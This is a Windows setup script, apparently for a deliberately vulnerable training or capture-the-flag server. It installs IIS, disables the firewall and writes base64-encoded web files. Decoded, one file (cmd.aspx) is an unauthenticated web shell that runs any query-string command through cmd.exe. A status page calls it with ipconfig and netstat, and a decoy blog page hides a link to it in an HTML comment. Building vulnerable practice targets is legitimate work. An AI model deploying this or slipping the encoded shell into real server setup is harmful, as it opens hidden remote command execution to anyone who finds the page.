dism /online /enable-feature /featurename:IIS-Webserverrole
Install-WindowsFeature -Name Web-Asp-Net45
netsh advfirewall set  currentprofile state off

mkdir c:\inetpub\wwwroot\serverstatus
[IO.File]::WriteAllBytes("c:\inetpub\wwwroot\serverstatus\Default.aspx", [Convert]::FromBase64String("PGgzPlNlcnZlciBJUDwvaDM+DQo8aWZyYW1lIHN0eWxlPSJ3aWR0aDogMTAwJSIgc3JjPSJjbWQuYXNweD9jbWQ9aXBjb25maWcgL2FsbCB8IGZpbmQgJTIySVB2NCUyMiI+PC9pZnJhbWU+DQo8aDM+U2VydmVyIGNvbm5lY3Rpb25zPC9oMz4NCjxpZnJhbWUgc3R5bGU9IndpZHRoOiAxMDAlIiBzcmM9ImNtZC5hc3B4P2NtZD1uZXRzdGF0IC1udCI+PC9pZnJhbWU+DQo="))
[IO.File]::WriteAllBytes("c:\inetpub\wwwroot\serverstatus\cmd.aspx", [Convert]::FromBase64String("PHByZT48JQ0KRGltIGNtZA0KY21kID0gUmVxdWVzdC5RdWVyeVN0cmluZygiY21kIikNCnJlc3BvbnNlLldyaXRlKENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLmV4ZWMoImNtZC5leGUgL2MgIiArIGNtZCkuU3RkT3V0LlJlYWRBbGwpDQolPjwvcHJlPg=="))
[IO.File]::WriteAllBytes("c:\inetpub\wwwroot\default.htm", [Convert]::FromBase64String("PGRpdiBzdHlsZT0ibWF4LXdpZHRoOiA2MDBweDsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0byI+DQo8aDE+QmlsbHkncyBCbG9nPC9oMT4NCjxici8+DQoNCjxoMj5OZXcgQ29tcHV0ZXI8L2gyPg0KPGk+WWVzdGVyZGF5LCAxMDo1M3BtPC9pPg0KPHA+SSBnb3QgYSBuZXcgc2VydmVyIGFuZCBhbSBnb2luZyB0byBzdGFydCBhIGJsb2chIFRoZXJlJ3Mgbm90IG11Y2gNCm5vdywgYnV0IEkgcGxhbiBvbiBrZWVwaW5nIGEgam91cm5hbCBvZiBteSBhZHZlbnR1cmVzIGluIHJ1bm5pbmcgYSBzZXJ2ZXIuDQoNCjwhLS0gVHJhdmlzIHNhaWQgdG8gbm90IHB1dCB0aGlzIG9uIHRoZSBob21lIHBhZ2UgYmVjYXVzZSB0aGVyZSBtaWdodCBiZSBhDQpwcm9ibGVtIHdpdGggaXQuIEknbGwganVzdCBjb21tZW50IGl0IG91dCBmb3Igbm93Lg0KDQpDaGVjayBvdXQgdGhlIDxhIGhyZWY9Ii9zZXJ2ZXJzdGF0dXMvIj5zZXJ2ZXIgc3RhdHVzPC9hPiB0byBzZWUgaG93IHdlbGwgaXQncyBkb2luZy4NCg0KLS0+PC9wPg0KDQo8L2Rpdj4NCg=="))